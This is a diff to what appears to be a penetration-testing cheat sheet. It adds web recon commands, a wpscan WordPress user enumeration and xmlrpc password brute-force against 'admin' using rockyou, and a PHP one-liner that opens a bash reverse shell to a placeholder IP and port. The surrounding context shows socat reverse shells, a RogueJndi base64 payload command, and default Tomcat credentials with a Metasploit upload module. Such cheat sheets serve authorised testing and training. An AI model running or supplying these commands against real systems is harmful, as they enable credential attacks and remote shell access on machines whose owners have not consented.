@@ -521,6 +521,8 @@ $ feroxbuster -w <wordlist> -u <URL>
 $ wfuzz -c -w <wordlist> -u http://FUZZ.<domain>
 $ nikto -h <IP address>
 $ eyewitness -f <URL list.txt> --web
+$ eyewitness -x <Nmap scan.xml> -d output --web
+$ cat <Nmap scan.xml> | ./aquatone -nmap
 $ whatweb <IP address>
 $ curl -v -X OPTIONS <IP address>
 $ curl http://<IP address> --upload-file test.txt
@@ -1019,6 +1021,13 @@ $ java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,<base64 payload>} 
 http://<IP address>:<port>/manager/html
 tomcat:s3cret
 use exploit/multi/http/tomcat_mgr_upload
+```
+
+- WordPress
+
+```
+$ sudo wpscan --url <URL> -e u,ap,at,cb,dbe
+$ sudo wpscan --password-attack xmlrpc -t 20 -U admin -P /usr/share/wordlists/rockyou.txt --url <URL>
 ```
 
 - PRTG Network Monitor
@@ -3135,6 +3144,7 @@ https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.p
 $ socat file:`tty`,raw,echo=0 tcp-listen:4444
 $ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<IP address>:4444
 msf> use exploit/multi/handler
+<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<IP address>/<port> 0>&1'");
 ```
 
 - Web Shells
